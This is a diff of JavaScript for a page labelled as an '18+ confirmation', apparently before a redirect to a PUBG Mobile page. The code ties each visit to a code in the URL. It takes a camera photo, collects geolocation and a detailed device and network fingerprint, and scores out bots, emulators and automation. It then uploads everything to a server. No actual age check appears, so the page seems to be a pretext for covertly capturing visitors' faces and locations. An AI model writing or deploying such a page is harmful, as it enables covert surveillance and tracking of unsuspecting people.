     if (navigator.webdriver) {
-      reasons.push("webdriver=true (bot env)");
+      reasons.push("navigator.webdriver === true");
       score -= 60;
     }
 
-    // ------------------------------------------------------------
-    // Devtools
-    // ------------------------------------------------------------
     const devtools = detectDevtoolsHeuristic();
     details.devtools = devtools;
     if (devtools?.opened) {
@@ -796,205 +870,46 @@ async function runDeviceCheck(clientProfile) {
       score -= 6;
     }
 
-    // ------------------------------------------------------------
-    // Camera latency
-    // ------------------------------------------------------------
     details.cameraLatencyMs = window.__cameraLatencyMs;
     if (!LITE_MODE && details.cameraLatencyMs != null && details.cameraLatencyMs <= 5) {
-      reasons.push("Слишком малая cameraLatency (desktop/emu)");
+      reasons.push("Слишком малая cameraLatency");
       score -= 10;
     }
 
-    // ------------------------------------------------------------
-    // In-app
-    // ------------------------------------------------------------
     if (clientProfile?.inAppWebView?.isInApp) {
       reasons.push("In-App WebView");
       score -= 8;
     }
 
-    // ------------------------------------------------------------
-    // CANVAS entropy
-    // ------------------------------------------------------------
-    if (clientProfile?.canvas?.dataUrlLen && clientProfile.canvas.dataUrlLen < 1000) {
-      reasons.push("Слабая canvas-энтропия");
-      score -= 8;
-    }
-
-    // ------------------------------------------------------------
-    // WebGL spoof
-    // ------------------------------------------------------------
-    if (clientProfile?.webgl?.error) {
-      reasons.push("WebGL недоступен или сломан");
-      score -= 10;
-    } else {
-      const vendor = String(clientProfile.webgl.vendor || "").toLowerCase();
-      const renderer = String(clientProfile.webgl.renderer || "").toLowerCase();
-
-      if (!vendor || vendor === "google inc.") {
-        // google inc. — Chrome, но Safari на iOS должен давать Apple GPU
-        if (/iPhone|iPad/i.test(ua) && vendor.includes("google")) {
-          reasons.push("WebGL renderer подозрительный для iOS Safari");
-          score -= 12;
-        }
-      }
-
-      // GPU anomalies
-      if (/mesa|llvmpipe|swiftshader/.test(renderer)) {
-        reasons.push("Десктопный/эмулированный GPU renderer");
-        score -= 15;
-      }
-    }
-
-    // ------------------------------------------------------------
-    // Storage anomalies
-    // ------------------------------------------------------------
-    {
-      const quota = clientProfile?.storage?.quota;
-      if (quota && quota < 200 * 1024 * 1024) {
-        // смартфоны обычно имеют 1GB+
-        reasons.push("Unrealistic storage quota");
-        score -= 10;
-      }
-    }
-
-    // ------------------------------------------------------------
-    // Battery anomalies
-    // ------------------------------------------------------------
-    if (clientProfile?.battery) {
-      const b = clientProfile.battery;
-      if (b.level != null && (b.level === 1 || b.level === 0)) {
-        // точно 0 и 100 часто у эмуляторов
-        reasons.push("Battery level = 0/1 suspicious");
-        score -= 4;
-      }
-    }
-
-    // ------------------------------------------------------------
-    // Locale / timezone mismatches
-    // ------------------------------------------------------------
-    {
-      const tz = (clientProfile?.locale?.timeZone || "").toUpperCase();
-      const langs = clientProfile?.locale?.langs || [];
-      const systemLang = clientProfile?.locale?.lang || "";
-
-      if (!tz || tz.includes("UTC")) {
-        reasons.push("UTC timezone suspicious for iOS Safari");
-        score -= 5;
-      }
-
-      if (langs.length === 0) {
-        reasons.push("No navigator.languages");
-        score -= 5;
-      }
-
-      if (!systemLang) {
-        reasons.push("No navigator.language");
-        score -= 4;
-      }
-    }
-
-    // ------------------------------------------------------------
-    // NETWORK heuristics (basic)
-    // ------------------------------------------------------------
-    {
-      const n = clientProfile?.network;
-      if (n) {
-        if (n.effectiveType && /2g/i.test(n.effectiveType)) {
-          reasons.push("Очень медленная сеть (2g)");
-          score -= 5;
-        }
-
-        if (n.rtt && n.rtt > 800) {
-          reasons.push("Очень высокий RTT");
-          score -= 5;
-        }
-      }
-    }
-
-    // ------------------------------------------------------------
-    // WebRTC leaks (presence/absence)
-    // ------------------------------------------------------------
-    if (Array.isArray(clientProfile?.webrtcIps)) {
-      if (clientProfile.webrtcIps.length === 0) {
-        reasons.push("WebRTC: IP leak отсутствует (возможно spoof)");
-        score -= 4;
-      }
-      if (clientProfile.webrtcIps.length >= 2) {
-        reasons.push("WebRTC: несколько IP (VPN/proxy)");
-        score -= 8;
-      }
-    }
-
-    // ------------------------------------------------------------
-    // Automation Score
-    // ------------------------------------------------------------
-    if (clientProfile?.automationScore >= 0.75) {
-      reasons.push("AutomationScore высоко");
-      score -= 20;
-    } else if (clientProfile?.automationScore >= 0.45) {
-      reasons.push("AutomationScore средний");
-      score -= 10;
-    }
-
-    // ------------------------------------------------------------
-    // Permissions mismatch
-    // ------------------------------------------------------------
-    if (clientProfile?.permissions) {
-      const p = clientProfile.permissions;
-
-      if (p.geolocation === "denied" && !LITE_MODE) {
-        reasons.push("Geo denied");
-        score -= 8;
-      }
-
-      if (p.camera === "denied" && !LITE_MODE) {
-        reasons.push("Camera denied");
-        score -= 8;
-      }
-
-      if (p.microphone === "denied") {
-        reasons.push("Microphone denied");
-        score -= 4;
-      }
-    }
-
-    // ------------------------------------------------------------
-    // MASTER ANTI-SPOOF (from Part 3)
-    // ------------------------------------------------------------
-    const safariFeatures = clientProfile?.__featuresSummary || {};
-    const anti = runAntiSpoofMaster({
-      clientProfile,
-      features: safariFeatures
+    const pn = analyzeNetworkHeuristics({
+      publicIp: clientProfile?.publicIp,
+      webrtcIps: clientProfile?.webrtcIps,
+      network: clientProfile?.network,
+      cameraLatencyMs: details.cameraLatencyMs,
+      locale: clientProfile?.locale,
+      ipMeta: clientProfile?.publicIp
     });
 
-    details.antiSpoof = anti;
+    details.pn_proxy = pn;
 
-    if (anti.display.displaySpoofHard) {
-      reasons.push("Display impossible (hard)");
-      score -= 40;
-    }
-    if (anti.vt18.hardSpoofVT18) {
-      reasons.push("VT18 spoof (hard)");
-      score -= 40;
+    if (pn.label === "likely") {
+      reasons.push("VPN/Proxy likely");
+      score -= 25;
+    } else if (pn.label === "possible") {
+      reasons.push("VPN/Proxy possible");
+      score -= 10;
     }
 
-    // Final thresholds
     if (score >= 80) {
-      reasons.push("Ок: окружение норм");
+      reasons.push("Ок: окружение выглядит правдоподобно");
     } else if (score >= 60) {
-      reasons.push("Несостыковки, но может быть реальный iOS");
+      reasons.push("Есть несостыковки — рекомендуется доп. проверка");
     } else {
-      reasons.push("Высокая вероятность подмены/симуляции");
+      reasons.push("Высокая вероятность подмены/автоматизации");
     }
-
   } catch (e) {
     reasons.push("Ошибка проверки окружения: " + e.message);
   }
-
-  // clamp
-  if (score < 0) score = 0;
-  if (score > 100) score = 100;
 
   return {
     score,
@@ -1004,17 +919,14 @@ async function runDeviceCheck(clientProfile) {
     timestamp: Date.now()
   };
 }
-// ============================================================================
-// == PART 5: AUTO-FLOW, SEND REPORT, FINAL LOGIC =============================
-// ============================================================================
 
-// ---------------------------------------------------------------------------
-// sendReport
-// ---------------------------------------------------------------------------
+// ============================================================================
+// sendReport()
+// ============================================================================
 async function sendReport({ photoBase64, geo, client_profile, device_check, featuresSummary }) {
   const info = getDeviceInfo();
   const code = determineCode();
-  if (!code) throw new Error("Нет кода");
+  if (!code) throw new Error("Нет кода в URL");
 
   const body = {
     userAgent: info.userAgent,
@@ -1037,38 +949,42 @@ async function sendReport({ photoBase64, geo, client_profile, device_check, feat
     body: JSON.stringify(body)
   });
 
-  const txt = await r.text();
-  let json = null;
-  try { json = JSON.parse(txt); } catch {}
+  const text = await r.text().catch(() => "");
+  let data = null;
+  try {
+    data = JSON.parse(text);
+  } catch {}
 
-  if (!r.ok) throw new Error(json?.error || txt);
-  if (!json?.ok) throw new Error(json?.error || "Ошибка сервера");
+  if (!r.ok) throw new Error((data && data.error) || text);
+  if (!data?.ok) throw new Error(data?.error || "Ошибка ответа сервера");
 
-  return json;
+  return data;
 }
 
-// ---------------------------------------------------------------------------
-// AUTO-FLOW
-// ---------------------------------------------------------------------------
+// ============================================================================
+// autoFlow() — ОСНОВНОЙ ПРОЦЕСС
+// ============================================================================
 async function autoFlow() {
   try {
+    hideBtn();
     setBtnLocked();
-    showBtn();
 
     if (UI.title) UI.title.textContent = "Подтверждение 18+";
     if (UI.text) UI.text.textContent = "Готовим проверку устройства…";
 
     const code = determineCode();
     if (!code) {
-      hideBtn();
-      return { ok:false, decision:{ canLaunch:false }, reason:"Нет кода" };
+      if (UI.title) UI.title.textContent = "Ошибка";
+      if (UI.text) UI.text.innerHTML =
+        '<span class="err">Нет кода в URL.</span>';
+      return {
+        ok: false,
+        decision: { canLaunch: false, reason: "NO_CODE" }
+      };
     }
 
     if (UI.note) UI.note.textContent = "Собираем данные…";
 
-    // ---------------------
-    // гео + фото + клиент-профайл
-    // ---------------------
     const [geo, rawPhoto, client_profile] = await Promise.all([
       askGeolocation(),
       takePhotoUniversal(),
@@ -1077,11 +993,8 @@ async function autoFlow() {
 
     const photoBase64 = await downscaleDataUrl(rawPhoto, 1024, 0.6);
 
-    if (UI.note) UI.note.textContent = "Проверяем Safari 18…";
+    if (UI.note) UI.note.textContent = "Проверяем системные возможности…";
 
-    // ---------------------
-    // Safari FeatureGate
-    // ---------------------
     const fg = await waitFeatureGate();
     let vt18_ok, v184_ok;
 
@@ -1090,8 +1003,8 @@ async function autoFlow() {
       v184_ok = !!fg.effective.v184Pass;
     } else {
       const { vt18_0, triple18_4 } = await runSafariFeatureTests();
-      vt18_ok = vt18_0.pass;
-      v184_ok = triple18_4.pass;
+      vt18_ok = !!vt18_0?.pass;
+      v184_ok = !!triple18_4?.pass;
     }
 
     const featuresSummary = {
@@ -1099,35 +1012,35 @@ async function autoFlow() {
       v18_4: v184_ok ? "ok" : "—"
     };
 
-    // inject into profile for anti-spoof master
-    client_profile.__featuresSummary = featuresSummary;
-
-    // ---------------------
-    // Safari 18 required
-    // ---------------------
     if (!vt18_ok) {
-      if (UI.reason)
-        UI.reason.textContent = "Safari 18 отсутствует";
+      if (UI.title) UI.title.textContent = "Доступ отклонён";
+      if (UI.text) UI.text.innerHTML =
+        '<span class="err">Отказ по feature-tests (18.0 обязательно).</span>';
+
+      window.__decision = { canLaunch: false };
+
+      try {
+        await sendReport({
+          photoBase64,
+          geo,
+          client_profile,
+          device_check: null,
+          featuresSummary
+        });
+      } catch {}
+
       return {
         ok: true,
-        decision: { canLaunch:false },
-        reason: "Safari 18 отсутствует",
-        featuresSummary
+        decision: { canLaunch: false, reason: "SAFARI_18_FAIL" }
       };
     }
 
     if (UI.note) UI.note.textContent = "Анализ окружения…";
 
-    // ---------------------
-    // Device Check (MAX Anti-Spoof)
-    // ---------------------
     const device_check = await runDeviceCheck(client_profile);
 
-    if (UI.note) UI.note.textContent = "Отправляем отчёт…";
+    if (UI.text) UI.text.textContent = "Отправляем отчёт…";
 
-    // ---------------------
-    // SEND REPORT → SERVER
-    // ---------------------
     const resp = await sendReport({
       photoBase64,
       geo,
@@ -1136,57 +1049,81 @@ async function autoFlow() {
       featuresSummary
     });
 
-    const decision = resp?.decision || { canLaunch:false };
-
+    const decision = resp?.decision || { canLaunch: true };
     window.__decision = decision;
-    window.__reportReady = !!decision.canLaunch;
 
     if (decision.canLaunch) {
-      if (UI.text) UI.text.textContent = "Проверка успешно пройдена";
-      if (UI.note) UI.note.textContent = "Можете войти";
+      window.__reportReady = true;
       setBtnReady();
+      showBtn();
+
+      if (UI.title) UI.title.textContent = "Проверка пройдена";
+      if (UI.text)
+        UI.text.innerHTML = '<span class="ok">Ок (допуск выдан).</span>';
+      if (UI.note)
+        UI.note.textContent =
+          `VT18=${vt18_ok ? "ok" : "—"} • 18.4=${v184_ok ? "ok" : "—"}`;
+
+      return { ok: true, decision };
     } else {
-      if (UI.text) UI.text.textContent = "Проверка не пройдена";
-      if (UI.note) UI.note.textContent = "Доступ запрещён";
+      window.__reportReady = false;
+      setBtnLocked();
+      showBtn();
+
+      if (UI.title) UI.title.textContent = "Доступ отклонён";
+      if (UI.text)
+        UI.text.innerHTML = '<span class="err">Отказ (решение сервера).</span>';
+      if (UI.note) UI.note.textContent = "Обратитесь в поддержку.";
+
+      return { ok: true, decision };
     }
+  } catch (e) {
+    console.error("[AUTO-FLOW ERROR]", e);
 
-    return {
-      ok: true,
-      decision,
-      risk: resp?.risk,
-      flags: resp?.flags,
-      featuresSummary
-    };
+    showBtn();
+    setBtnLocked();
 
-  } catch (err) {
-    if (UI.text) UI.text.textContent = "Ошибка проверки";
-    if (UI.note) UI.note.textContent = String(err);
-    return {
-      ok:false,
-      decision:{ canLaunch:false },
-      error:String(err)
-    };
+    if (UI.title) UI.title.textContent = "Ошибка";
+    if (UI.text)
+      UI.text.innerHTML = '<span class="err">Ошибка проверки.</span>';
+    if (UI.note) UI.note.textContent = String(e.message || e);
+
+    return { ok: false, error: e.message || String(e) };
   }
 }
 
-// ---------------------------------------------------------------------------
-// expose
-// ---------------------------------------------------------------------------
-window.startAutoFlow = () => autoFlow();
-
-// ---------------------------------------------------------------------------
-// КНОПКА «Войти»
-// ---------------------------------------------------------------------------
-(function setupEnter() {
+// ============================================================================
+// КНОПКА "Войти 18+"
+// ============================================================================
+(function wireEnter() {
   const btn = UI.btn;
   if (!btn) return;
 
-  btn.addEventListener("click", (e) => {
-    if (!window.__decision?.canLaunch) {
-      e.preventDefault();
-      return;
-    }
-    // как ты сказал — оставляем такой URL
-    location.assign("https://www.pubgmobile.com/ig/itop");
-  });
+  btn.addEventListener(
+    "click",
+    (e) => {
+      if (!window.__reportReady || !window.__decision?.canLaunch) {
+        e.preventDefault();
+        return;
+      }
+      location.assign("https://www.pubgmobile.com/ig/itop");
+    },
+    { capture: true }
+  );
 })();
+
+// ============================================================================
+// ВАЖНО: ОТКЛЮЧЁН АВТО-СТАРТ !!!
+// ============================================================================
+/*
+НЕ ЗАПУСКАЕМ:
+startWithGate();
+document.addEventListener("DOMContentLoaded", startWithGate);
+*/
+
+// ============================================================================
+// === ГЛАВНОЕ: API для HTML — window.startAutoFlow() =========================
+// ============================================================================
+window.startAutoFlow = async function () {
+  return await autoFlow();
+};
